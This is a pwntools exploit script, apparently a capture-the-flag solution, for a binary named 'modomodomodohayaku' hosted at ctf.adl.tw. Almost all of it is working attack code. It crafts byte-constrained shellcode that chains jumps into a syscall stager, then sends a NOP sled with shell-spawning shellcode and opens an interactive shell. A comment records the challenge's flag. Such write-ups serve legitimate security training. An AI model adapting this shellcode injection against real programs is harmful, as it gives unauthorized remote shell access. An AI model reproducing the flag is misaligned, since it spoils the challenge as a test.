#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union

binary = ELF("./modomodomodohayaku")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]


def one_gadget(filename: str) -> list:
    return [int(i) for i in
            __import__('subprocess').check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


GDB_SCRIPT = '''
b *0x4014B8
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path], env={"LD_PRELOAD": "./libnosleep.so"})
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT, env={"LD_PRELOAD": "./libnosleep.so"})
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10007)
    return io

def fix(payload):
    print(payload)
    payload = list(payload)
    edx = 0
    for edx in range(0x10):
        # mov     eax, edx
        # shl     eax, 2
        # add     eax, edx
        eax = edx
        eax = eax << 2
        eax = eax + edx
        print(eax)
        payload[eax] = 0xc
        payload[eax + 1] = 0x87
        payload[eax + 2] = 0x63

    return bytes(payload)


def main():
    io = conn()

    # every 5 bytes starts with `\x0c\x87\x63`
    payload = b"\x0c\x87\x63\xd1"  # mov al, 0x87; movsxd edx, ecx
    payload += asm(
        '''
        jmp $+0xc
        '''
    )
    # payload = payload.ljust(8, b"\x00")
    # payload += asm("syscall")
    # payload = payload.ljust(13, b"\x00")
    # payload += asm("syscall")
    payload = payload.ljust(18, b"\x00")
    payload += asm(
        '''
        jmp $+4
        '''
    )
    payload = payload.ljust(23, b"\x00")
    payload += b"\xc7" # mov al, 0x87; movsxd eax, edi
    payload += asm(
        '''
        jmp $+0xc
        '''
    )
    # payload = payload.ljust(28, b"\x00")
    # payload += asm("syscall")
    # payload = payload.ljust(33, b"\x00")
    # payload += asm("syscall")
    payload = payload.ljust(38, b"\x00")
    payload += asm("syscall")

    nop_sled_len = len(payload)
    info(f"payload len: {nop_sled_len}")
    payload = payload.ljust(0x50, b'\x00')
    payload = fix(payload)
    print(payload)
    io.sendafter(b"!!!\n", payload)
    payload = b"\x90" * nop_sled_len
    payload += asm(shellcraft.sh())
    io.sendline(payload)
    io.interactive() # ADL{us0d4r0......https://youtu.be/KId6eunoiWk}


if __name__ == "__main__":
    main()
